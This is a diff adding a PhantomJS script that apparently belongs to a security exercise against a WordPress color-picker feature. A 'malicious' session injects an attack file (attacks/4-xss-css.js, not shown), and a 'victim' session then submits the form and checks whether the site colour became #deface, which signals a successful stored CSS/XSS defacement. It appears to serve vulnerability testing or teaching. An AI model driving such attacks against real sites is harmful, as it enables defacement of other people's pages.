@@ -1,0 +1,54 @@
+#!/usr/bin/env phantomjs
+
+var wp = require( './wp' );
+
+var victimPage = wp.page( 'VICTIM' );
+var maliciousPage = wp.page( 'MALICIOUS' );
+
+console.log( "Malicious: loading homepage" );
+maliciousPage.open( wp.url, function() {
+	console.log( "Malicious: injecting attacks/4-xss-css.js" );
+	maliciousPage.evaluate( function( url ) {
+		jQuery.getScript( url + 'attacks/4-xss-css.js' );
+	}, wp.url );
+
+	setTimeout( function() {
+		phantom.clearCookies();
+
+		console.log( "Victim: loading homepage" );
+		victimPage.open( wp.url, function() {
+			victimPage.onLoadFinished = function() {
+				var color = victimPage.evaluate( function() {
+					return jQuery( 'div.site' ).css( 'color' );
+				} );
+
+				color = color.replace( /\s/g, '' ).toLowerCase();
+
+				console.log( "Victim: found color=" + color );
+
+				switch ( color ) {
+				case 'rgb(222,250,206)':
+				case 'rgba(222,250,206,1)':
+				case '#deface':
+					phantom.exit();
+					break;
+				default:
+					phantom.exit( 1 );
+					break;
+				}
+			};
+
+			console.log( "Victim: clicking first recent color, submitting form" );
+			var recent = victimPage.evaluate( function() {
+				var recent = jQuery( '.recent-colors img:first' ).click().size();
+				jQuery( '#vip-background-color-picker' ).submit();
+				return recent;
+			} );
+
+			if ( ! recent ) {
+				console.log( "No recent color :(" );
+				phantom.exit( 1 );
+			}
+		} );
+	}, 3000 );
+} );
